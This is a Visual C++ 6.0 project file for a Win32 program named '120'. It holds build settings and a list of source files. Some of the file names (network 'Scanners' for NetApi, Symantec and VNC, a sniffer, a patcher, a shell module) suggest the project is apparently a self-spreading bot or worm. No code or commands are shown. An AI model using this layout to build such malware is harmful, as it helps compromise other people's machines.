# Microsoft Developer Studio Project File - Name="120" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=120 - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "120.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "120.mak" CFG="120 - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "120 - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "120 - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "120 - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "120"
# PROP BASE Intermediate_Dir "120"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "120"
# PROP Intermediate_Dir "120"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 user32.lib /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "120 - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "120"
# PROP BASE Intermediate_Dir "120"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "120"
# PROP Intermediate_Dir "120"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 user32.lib /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "120 - Win32 Release"
# Name "120 - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Scanner Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Scanners\Netapi.cpp
# End Source File
# Begin Source File

SOURCE=.\Scanners\Sym.cpp
# End Source File
# Begin Source File

SOURCE=.\vncshit.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\120.cpp
# End Source File
# Begin Source File

SOURCE=.\Adv.cpp
# End Source File
# Begin Source File

SOURCE=.\Crc.cpp
# End Source File
# Begin Source File

SOURCE=.\Cry.cpp
# End Source File
# Begin Source File

SOURCE=.\d3des.c
# End Source File
# Begin Source File

SOURCE=.\Ide.cpp
# End Source File
# Begin Source File

SOURCE=.\Ldll.cpp
# End Source File
# Begin Source File

SOURCE=.\patcher.cpp
# End Source File
# Begin Source File

SOURCE=.\Rnd.cpp
# End Source File
# Begin Source File

SOURCE=.\Shel.cpp
# End Source File
# Begin Source File

SOURCE=.\sniff.cpp
# End Source File
# Begin Source File

SOURCE=.\Sys.cpp
# End Source File
# Begin Source File

SOURCE=.\Test.cpp
# End Source File
# Begin Source File

SOURCE=.\Thr.cpp
# End Source File
# Begin Source File

SOURCE=.\ver.c
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Scanner Header"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Scanners\Netapi.h
# End Source File
# Begin Source File

SOURCE=.\Scanners\Sym.h
# End Source File
# Begin Source File

SOURCE=.\vncshit.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\120.h
# End Source File
# Begin Source File

SOURCE=.\Adv.h
# End Source File
# Begin Source File

SOURCE=.\Cmd.h
# End Source File
# Begin Source File

SOURCE=.\Conf.h
# End Source File
# Begin Source File

SOURCE=.\Crc.h
# End Source File
# Begin Source File

SOURCE=.\Cry.h
# End Source File
# Begin Source File

SOURCE=.\d3des.h
# End Source File
# Begin Source File

SOURCE=.\Def.h
# End Source File
# Begin Source File

SOURCE=.\Ext.h
# End Source File
# Begin Source File

SOURCE=.\Fun.h
# End Source File
# Begin Source File

SOURCE=.\Glo.h
# End Source File
# Begin Source File

SOURCE=.\Ide.h
# End Source File
# Begin Source File

SOURCE=.\Inc.h
# End Source File
# Begin Source File

SOURCE=.\Ldll.h
# End Source File
# Begin Source File

SOURCE=.\patcher.h
# End Source File
# Begin Source File

SOURCE=.\rfb.h
# End Source File
# Begin Source File

SOURCE=.\Rnd.h
# End Source File
# Begin Source File

SOURCE=.\Shel.h
# End Source File
# Begin Source File

SOURCE=.\sniff.h
# End Source File
# Begin Source File

SOURCE=.\Str.h
# End Source File
# Begin Source File

SOURCE=.\Sys.h
# End Source File
# Begin Source File

SOURCE=.\Tcp.h
# End Source File
# Begin Source File

SOURCE=.\Test.h
# End Source File
# Begin Source File

SOURCE=.\Thr.h
# End Source File
# Begin Source File

SOURCE=.\ver.h
# End Source File
# End Group
# End Target
# End Project
